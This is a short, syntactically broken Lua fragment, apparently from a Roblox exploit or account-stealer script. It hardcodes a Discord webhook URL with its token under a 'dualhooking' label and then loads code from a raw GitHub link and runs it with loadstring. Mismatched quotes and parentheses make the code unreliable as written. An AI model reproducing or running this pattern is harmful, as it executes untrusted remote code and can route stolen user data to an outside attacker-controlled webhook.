...
local dhuser = "TolinRabadu"       -- dualhooking user
local dhwebhook = "https://discord.com/api/webhooks/1133931887556051034/B22LeoRDaFTT32dkHoHyTaoLfMuHoo-AUdqan19hWRzo__6bn062CVIigkxcfFbxt8mO" -- Dualhooking Webhook
local loadingraw = "HttpGet("https://raw.githubusercontent.com/NeewGood/loaaa/main/.lua" -- Put Your LoadingScreen Raw Link Here
...
if _G.LoadingScreen ~= true then
    loadstring(game:HttpGet(HttpGet("loadingraw))()
end
